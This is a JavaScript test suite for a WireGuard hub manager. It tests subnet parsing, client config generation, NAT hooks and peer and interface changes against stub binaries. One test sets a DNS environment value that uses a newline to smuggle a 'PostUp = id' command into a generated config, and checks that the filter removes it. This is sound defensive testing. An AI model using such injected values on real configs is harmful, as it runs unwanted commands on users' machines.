	// The old /24 clamp turned a /25 hub into a MASQUERADE for twice the tunnel.
	assert.equal(t("Address = 10.10.0.129/25"), "10.10.0.128/25");
	// …and kept host bits on shorter prefixes (never matched the kernel route).
	assert.equal(t("Address = 10.10.5.1/16"), "10.10.0.0/16");
	assert.equal(t("Address = fd00::1/64, 10.20.0.1/24"), "10.20.0.0/24", "first IPv4 token");
	assert.equal(t("Address = fd00::1/64"), "10.10.0.0/24", "no IPv4 → fallback");
	assert.equal(_tunnelSubnetFromConfLines(["[Interface]"]), "10.10.0.0/24");
});

// ─── buildClientConfig (shared by createPeer + generatePeerConfig) ──────────

test("buildClientConfig: DNS precedence, injection filter, full tunnel, road-warrior reach", () => {
	const prevDns = process.env.WG_DNS;
	const base = {
		displayName: "Laptop",
		filenameBase: "Lap top",
		privateKey: "PRIV",
		publicKey: "PUB",
		tunnelAddress: "10.10.0.7/24",
		linkDns: [],
		ifaceDns: [],
		fullTunnel: false,
		platform: undefined,
		importedNets: [],
		tunnelSubnets: ["10.10.0.1/24"],
		links: [
			{ id: "wg0:self", interfaceName: "wg0", exportedNetworks: ["192.168.99.0/24"] },
			{ id: "wg0:site", interfaceName: "wg0", exportedNetworks: ["192.168.50.0/24"] },
			{ id: "wg1:other", interfaceName: "wg1", exportedNetworks: ["192.168.60.0/24"] },
		],
		excludeLinkId: "wg0:self",
		ifaceName: "wg0",
		hubPublicKey: "HUBPUB",
		hubHost: "hub.example",
		hubListenPort: 51820,
	};
	try {
		process.env.WG_DNS = "9.9.9.9, evil\nPostUp = id";
		const line = (cfg, key) => cfg.content.split("\n").find((l) => l.startsWith(`${key} = `));

		// link > interface > env; anything that is not an IP/host name is dropped
		assert.equal(
			line(buildClientConfig({ ...base, linkDns: ["1.1.1.1"], ifaceDns: ["8.8.8.8"] }), "DNS"),
			"DNS = 1.1.1.1",
		);
		assert.equal(line(buildClientConfig({ ...base, ifaceDns: ["8.8.8.8"] }), "DNS"), "DNS = 8.8.8.8");
		const envCfg = buildClientConfig(base);
		assert.equal(line(envCfg, "DNS"), "DNS = 9.9.9.9");
		assert.ok(!envCfg.content.includes("PostUp"), "env DNS injection filtered");

		// road warrior: tunnel subnet + other links' exports on the same interface only
		assert.equal(line(envCfg, "AllowedIPs"), "AllowedIPs = 10.10.0.1/24, 192.168.50.0/24");
		assert.equal(envCfg.filename, "Lap_top.conf");
		assert.equal(line(envCfg, "PublicKey"), "PublicKey = HUBPUB");
		assert.ok(envCfg.content.includes("# PublicKey = PUB"));
		assert.equal(line(envCfg, "Endpoint"), "Endpoint = hub.example:51820");

		// full tunnel literals
		assert.equal(
			line(buildClientConfig({ ...base, fullTunnel: true }), "AllowedIPs"),
			"AllowedIPs = 0.0.0.0/1, 128.0.0.0/1, ::/1, 8000::/1",
		);
		assert.equal(
			line(buildClientConfig({ ...base, fullTunnel: true, platform: "mobile" }), "AllowedIPs"),
			"AllowedIPs = 0.0.0.0/0, ::/0",
		);

		// explicit reach list wins; empty list falls back to 0.0.0.0/0
		assert.equal(
			line(buildClientConfig({ ...base, importedNets: ["192.168.70.0/24"] }), "AllowedIPs"),
			"AllowedIPs = 192.168.70.0/24",
		);
		assert.equal(
			line(buildClientConfig({ ...base, tunnelSubnets: [], links: [] }), "AllowedIPs"),
			"AllowedIPs = 0.0.0.0/0",
		);

		// no hub public key → no `PublicKey = null` line
		const noHub = buildClientConfig({ ...base, hubPublicKey: null });
		assert.ok(!/^PublicKey = /m.test(noHub.content));
	} finally {
		if (prevDns === undefined) delete process.env.WG_DNS;
		else process.env.WG_DNS = prevDns;
	}
});

// ─── natCandidates come from undecided return paths ─────────────────────────

test("natCandidates lists imported nets of non-client links with an undecided return path", () => {
	const topology = buildTopology(
		[],
		[
			{ type: "site-to-site", returnPathMode: "unknown", importedNetworks: ["192.168.70.0/24"] },
			{ type: "site-to-site", returnPathMode: "nat", importedNetworks: ["192.168.71.0/24"] },
			{ type: "client", returnPathMode: "unknown", importedNetworks: ["192.168.72.0/24"] },
		],
	);
	const live = { destination: "192.168.70.0/24", device: "wg0", via: null, raw: "192.168.70.0/24 dev wg0" };
	const ra = buildRouteAnalysis({ all: [live], wireguard: [live], privateRoutes: [live] }, topology);
	assert.deepEqual(ra.natCandidates, [{ network: "192.168.70.0/24", reason: "return-path-unclear" }]);
	assert.ok(!ra.missingReturnRoutes.some((r) => r.network === "192.168.70.0/24"), "route is live");
});

// ─── fake WireGuard environment for the mutation paths ───────────────────────

async function withFakeHub({ conf, metadata, dump }, fn) {
	const root = await mkdtemp(path.join(os.tmpdir(), "fg-wgt-"));
	const confDir = path.join(root, "conf");
	const binDir = path.join(root, "bin");
	const metadataFile = path.join(root, "meta.json");
	await mkdir(confDir, { recursive: true });
	await mkdir(binDir, { recursive: true });
	for (const [name, text] of Object.entries(conf)) await writeFile(path.join(confDir, `${name}.conf`), text);
	await writeFile(metadataFile, `${JSON.stringify(metadata)}\n`);
	const stub = async (name, body) => {
		await writeFile(path.join(binDir, name), `#!/usr/bin/env bash\n${body}\n`);
		await chmod(path.join(binDir, name), 0o755);
	};
	await stub(
		"wg",
		`case "$1" in
  show) printf '%b' '${dump.replace(/\n/g, "\\n").replace(/\t/g, "\\t")}' ;;
  genkey) echo "cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=" ;;
  pubkey) echo "bmV3cHVia2V5bmV3cHVia2V5bmV3cHVia2V5MTIzNDU=" ;;
esac`,
	);
	await stub("ip", "exit 0");
	// deleteInterface shells out to these by name: never reach the real host.
	await stub("wg-quick", "exit 0");
	await stub("systemctl", "exit 0");
	const prev = {
		WG_CONF_DIR: process.env.WG_CONF_DIR,
		WG_BIN: process.env.WG_BIN,
		IP_BIN: process.env.IP_BIN,
		WG_METADATA_FILE: process.env.WG_METADATA_FILE,
		PATH: process.env.PATH,
	};
	Object.assign(process.env, {
		WG_CONF_DIR: confDir,
		WG_BIN: path.join(binDir, "wg"),
		IP_BIN: path.join(binDir, "ip"),
		WG_METADATA_FILE: metadataFile,
		PATH: `${binDir}:${process.env.PATH}`,
	});
	const { default: internalAgent } = await import("./agent.js");
	const origSync = internalAgent.syncAgentConfigs;
	internalAgent.syncAgentConfigs = async () => [];
	try {
		const mod = await import(`./wireguard.js?wgt=${Date.now()}-${Math.random()}`);
		mod._setBoundAgentCascadeDepsForTests({ loadAgents: async () => [] });
		return await fn({ mod, confDir, metadataFile });
	} finally {
		internalAgent.syncAgentConfigs = origSync;
		for (const [k, v] of Object.entries(prev)) {
			if (v === undefined) delete process.env[k];
			else process.env[k] = v;
		}
		await rm(root, { recursive: true, force: true });
	}
}

const FAKE_HUB_CONF =
	"[Interface]\nAddress = 10.10.0.1/24\nListenPort = 51820\nPrivateKey = hub-priv\n\n" +
	"[Peer]\nPublicKey = site-pk\nAllowedIPs = 10.10.0.5/32, 192.168.77.0/24\n";
const FAKE_HUB_DUMP =
	"wg0\thub-priv\thub-pub\t51820\toff\n" +
	"wg0\tsite-pk\t(none)\t1.2.3.4:51820\t10.10.0.5/32,192.168.77.0/24\t4102444800\t10\t20\t0\n";
const FAKE_META = () => ({
	interfaces: {},
	links: { "wg0:site-pk": { name: "site-x", type: "site-to-site", importedNetworks: ["192.168.77.0/24"] } },
});

test("applyMetadataPatch: a throwing validate leaves the store byte-identical", async () => {
	await withFakeHub(
		{ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP },
		async ({ mod, metadataFile }) => {
			const before = await readFile(metadataFile, "utf8");
			await assert.rejects(
				mod.default.applyMetadataPatch(
					{ links: { "wg0:site-pk": { name: "renamed" } } },
					{
						validate: () => {
							throw new Error("nope");
						},
					},
				),
				/nope/,
			);
			assert.equal(await readFile(metadataFile, "utf8"), before);
		},
	);
});

test("updatePeer: a failing hub conf write is reported, the agent resync still runs", async () => {
	await withFakeHub(
		{ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP },
		async ({ mod, confDir, metadataFile }) => {
			// writeConfAtomic opens `<conf>.tmp-<pid>`: a directory there makes it fail (EISDIR).
			await mkdir(path.join(confDir, `wg0.conf.tmp-${process.pid}`));
			const res = await mod.default.updatePeer("wg0:site-pk", { importedNetworks: ["192.168.78.0/24"] });
			assert.equal(res.updated, true);
			assert.ok(res.hubSync?.error, "hub sync failure surfaced");
			assert.deepEqual(res.agentSync, [], "agent resync ran");
			const meta = JSON.parse(await readFile(metadataFile, "utf8"));
			assert.deepEqual(meta.links["wg0:site-pk"].importedNetworks, ["192.168.78.0/24"]);
		},
	);
});

test("deleteInterface + concurrent createPeer on it never leave a conf or links behind", async () => {
	const WG7 = "[Interface]\nAddress = 10.77.0.1/24\nListenPort = 51877\nPrivateKey = p7\n";
	await withFakeHub(
		{
			conf: { wg0: FAKE_HUB_CONF, wg977: WG7 },
			metadata: { interfaces: { wg977: { role: "auxiliary" } }, links: {} },
			dump: FAKE_HUB_DUMP,
		},
		async ({ mod, confDir, metadataFile }) => {
			const [del, created] = await Promise.allSettled([
				mod.default.deleteInterface("wg977"),
				mod.default.createPeer({ name: "late", type: "client", ifaceName: "wg977" }),
			]);
			assert.equal(del.status, "fulfilled", del.reason?.message);
			if (created.status === "rejected") assert.match(created.reason.message, /wg977 not found/);
			await assert.rejects(access(path.join(confDir, "wg977.conf")), { code: "ENOENT" });
			const meta = JSON.parse(await readFile(metadataFile, "utf8"));
			assert.ok(!meta.interfaces.wg977);
			assert.deepEqual(
				Object.keys(meta.links).filter((id) => id.startsWith("wg977:")),
				[],
			);
		},
	);
});

test("_masqIptablesBin reconciles on the default conf dir and only skips a custom one", () => {
	assert.equal(_masqIptablesBin({}), "iptables");
	assert.equal(_masqIptablesBin({ WG_CONF_DIR: "/etc/wireguard" }), "iptables");
	assert.equal(_masqIptablesBin({ WG_CONF_DIR: "/etc/wireguard/" }), "iptables");
	assert.equal(_masqIptablesBin({ WG_CONF_DIR: "/tmp/wg-test" }), null);
	assert.equal(_masqIptablesBin({ WG_CONF_DIR: "/tmp/wg-test", IPTABLES_BIN: "/tmp/ipt" }), "/tmp/ipt");
});

test("_previousOwnedMasq = marker keys plus generated-form hook commands (legacy confs)", () => {
	const marked = _previousOwnedMasq([
		"[Interface]",
		"# floppyguard-masq: eth0=192.168.1.0/24",
		"PostUp = iptables -t nat -A POSTROUTING -o eth0 -s 192.168.1.0/24 -j MASQUERADE",
	]);
	assert.deepEqual([...marked].sort(), ["eth0=192.168.1.0/24"]);

	const legacy = _previousOwnedMasq([
		"[Interface]",
		"PostUp = ip route add 10.1.0.0/24 dev wg0 2>/dev/null || true; iptables -t nat -A POSTROUTING -o eth1 -s 10.0.0.0/24 -j MASQUERADE",
		"PostDown = iptables -t nat -D POSTROUTING -o eth1 -s 10.0.0.0/24 -j MASQUERADE 2>/dev/null || true",
		"[Peer]",
		"PublicKey = abc",
	]);
	assert.deepEqual([...legacy], ["eth1=10.0.0.0/24"]);

	// A fresh runtime-created conf owns nothing yet: every key gets its own live copy.
	assert.equal(_previousOwnedMasq(["[Interface]", "Address = 10.20.0.1/24"]).size, 0);
});

test("updatePeer cascades the EFFECTIVE name: a cleared name or a retype of an unnamed link", async () => {
	const { default: internalAgent } = await import("./agent.js");
	const orig = internalAgent.renameLinkBinding;
	const calls = [];
	internalAgent.renameLinkBinding = async (from, to) => {
		calls.push([from, to]);
		return { wgLinkName: 0, allowedSites: 0 };
	};
	try {
		await withFakeHub(
			{ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP },
			async ({ mod }) => {
				await mod.default.updatePeer("wg0:site-pk", { name: "" });
			},
		);
		assert.deepEqual(calls, [["site-x", "site-to-site-site-pk"]]);

		calls.length = 0;
		await withFakeHub(
			{
				conf: { wg0: FAKE_HUB_CONF },
				metadata: {
					interfaces: {},
					links: { "wg0:site-pk": { type: "site-to-site", importedNetworks: ["192.168.77.0/24"] } },
				},
				dump: FAKE_HUB_DUMP,
			},
			async ({ mod }) => {
				await mod.default.updatePeer("wg0:site-pk", { type: "client" });
			},
		);
		assert.deepEqual(calls, [["site-to-site-site-pk", "client-site-pk"]]);
	} finally {
		internalAgent.renameLinkBinding = orig;
	}
});

test("deleteInterface: bad names are a 400, a missing conf is a stable 'not found'", async () => {
	await withFakeHub({ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP }, async ({ mod }) => {
		await assert.rejects(mod.default.deleteInterface("eth0"), (e) => e.status === 400 && e.public === true);
		await assert.rejects(mod.default.deleteInterface("wg0"), (e) => e.status === 400 && e.public === true);
		await assert.rejects(mod.default.deleteInterface("wg99"), /^Error: Interface wg99 not found$/);
	});
});

test("createInterface rejects an out-of-range or colliding listen port before writing a conf", async () => {
	await withFakeHub(
		{ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP },
		async ({ mod, confDir }) => {
			for (const listenPort of [70000, 1.5, -1, Number.NaN, 51820]) {
				await assert.rejects(
					mod.default.createInterface({ address: "10.20.0.1/24", listenPort }),
					(e) => e.public === true && e.status === 400,
					String(listenPort),
				);
			}
			await assert.rejects(access(path.join(confDir, "wg1.conf")), { code: "ENOENT" });
		},
	);
});

test("createPeer rejects an invalid type before any side effect", async () => {
	await withFakeHub(
		{ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP },
		async ({ mod, confDir, metadataFile }) => {
			const before = await readFile(metadataFile, "utf8");
			await assert.rejects(
				mod.default.createPeer({ name: "x", type: "clinet", importedNetworks: ["10.99.0.0/24"] }),
				(e) => e.status === 400 && /Invalid type/.test(e.message),
			);
			assert.equal(await readFile(metadataFile, "utf8"), before);
			assert.equal(await readFile(path.join(confDir, "wg0.conf"), "utf8"), FAKE_HUB_CONF);
		},
	);
});

test("createPeer seeds the peer-config cache: an immediate Download returns the same material", async () => {
	await withFakeHub({ conf: { wg0: FAKE_HUB_CONF }, metadata: FAKE_META(), dump: FAKE_HUB_DUMP }, async ({ mod }) => {
		const created = await mod.default.createPeer({ name: "laptop", type: "client" });
		const dl = await mod.default.generatePeerConfig(created.linkId);
		assert.deepEqual(dl, { filename: created.filename, content: created.content, publicKey: created.publicKey });
	});
});
